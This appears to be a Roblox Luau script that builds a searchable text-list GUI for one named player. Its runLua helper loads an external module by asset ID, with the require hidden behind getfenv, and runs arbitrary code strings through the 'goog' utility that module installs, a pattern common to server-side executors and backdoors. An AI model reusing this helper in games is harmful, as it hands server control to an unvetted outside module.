--!strict
local Players = game:GetService("Players")
local ServerScriptService = game:GetService("ServerScriptService")
local runLua = function(caller: Player, code: string, waitDelete: number?)
    if not ServerScriptService:FindFirstChild("goog") then
        local ticking = tick()
        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = ServerScriptService:FindFirstChild("goog")
    local p = caller

    if not goog then
        error("goog failed to be added, command can not continue")
    end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr:WaitForChild("Exec").Value = code

    return scr
end

type GuiOptions = {
    SearchBar: boolean?,
}

local function NewGui(labels: {}, options: GuiOptions?): ScreenGui
    -- had to shadow so error doesnt appear
    local options: GuiOptions = options or {}

	local cmdGui = Instance.new("ScreenGui")
	cmdGui.Name = "CMDSGUI"

	local mainFrame = Instance.new("Frame", cmdGui)
	mainFrame.Style = Enum.FrameStyle.RobloxRound
	mainFrame.Size = UDim2.new(0, 400, 0, 400)
	mainFrame.Position = UDim2.new(0.5, -200, 0.5, -200)
	Instance.new("UIDragDetector", mainFrame)

	local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
	scrollFrame.Size = UDim2.new(1, 0, 1, -20)
	scrollFrame.Position = UDim2.new(0, 0, 0, 20)
	scrollFrame.BackgroundTransparency = 1
	scrollFrame.ScrollBarThickness = 7
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

	local innerFrame = Instance.new("Frame", scrollFrame)
	innerFrame.Size = UDim2.new(1, 0, 0, 0)
	innerFrame.Position = UDim2.new(0, 0, 0, 0)
	innerFrame.Transparency = 1

	local baseLabel = Instance.new("TextLabel")
	baseLabel.TextXAlignment = Enum.TextXAlignment.Left
	baseLabel.TextYAlignment = Enum.TextYAlignment.Top
	baseLabel.TextSize = 18
	baseLabel.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	baseLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	baseLabel.BackgroundTransparency = 1
	baseLabel.RichText = true

	for i, v in ipairs(labels) do
		local newLabel = baseLabel:Clone()
		newLabel.Text = v
		newLabel.Position = UDim2.new(0, 0, 0, (i - 1) * 20)
		newLabel.Size = UDim2.new(1, 0, 0, 20)
		newLabel.Visible = true
		newLabel.Parent = innerFrame
	end

	innerFrame.Size = UDim2.new(1, 0, 0, #labels * 20)
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, innerFrame.Size.Y.Offset)

    if options.SearchBar then
        local searchBox = Instance.new("TextBox", mainFrame)
        searchBox.Size = UDim2.new(1, -20, 0, 20)
        searchBox.Position = UDim2.new(0, 0, 0, 0)
        searchBox.BackgroundTransparency = 0.5
        searchBox.BackgroundColor3 = Color3.fromHex("#000000")
        searchBox.TextColor3 = Color3.fromHex("#c8c8c8")
        searchBox.PlaceholderText = " Search something here >.<"
        searchBox.Text = ""
        searchBox.TextXAlignment = Enum.TextXAlignment.Left
        searchBox.ClearTextOnFocus = true

        local inputChangedEvent = Instance.new("RemoteEvent", mainFrame)
        inputChangedEvent.OnServerEvent:Connect(function(a0: Player, msg: string)
            -- TODO: strip function for richtext format
            for i,v in pairs(innerFrame:GetChildren()) do
                local lab = v :: TextLabel
                lab.Visible = string.find(lab.Text:lower(), searchBox.Text:lower()) ~= nil
            end 
        end)
        
        -- localscript for transmitting data
        local script = runLua(Players.SnowClan_8342, `local searchBox = script.Parent:FindFirstChild("TextBox") :: TextBox searchBox:GetPropertyChangedSignal("Text"):Connect(function(input: InputObject) local event: RemoteEvent = script.Parent:FindFirstChild("RemoteEvent") event:FireServer(searchBox.Text) end)`)
        script.Parent = mainFrame
        script.Enabled = true
    end

	local closeButton = Instance.new("TextButton", mainFrame)
	closeButton.TextSize = 18
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	closeButton.Size = UDim2.new(0, 20, 0, 20)
	closeButton.Text = "X"
	closeButton.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeButton.Position = UDim2.new(1, -17, 0, 0)
	closeButton.MouseButton1Click:Connect(function(...)
		cmdGui:Destroy()
	end)

	return cmdGui
end

NewGui({
    `I want the <font color="#FF7800">orange</font> candy.`,
    `I want the <font color="#FF0000">red</font> candy.`,
    `I want the <font color="#0078FF">blue</font> candy.`,
    `I want the <font color="#0000FF">blue</font> candy.`
}, {
    SearchBar = true
}).Parent = game.Players.SnowClan_8342.PlayerGui
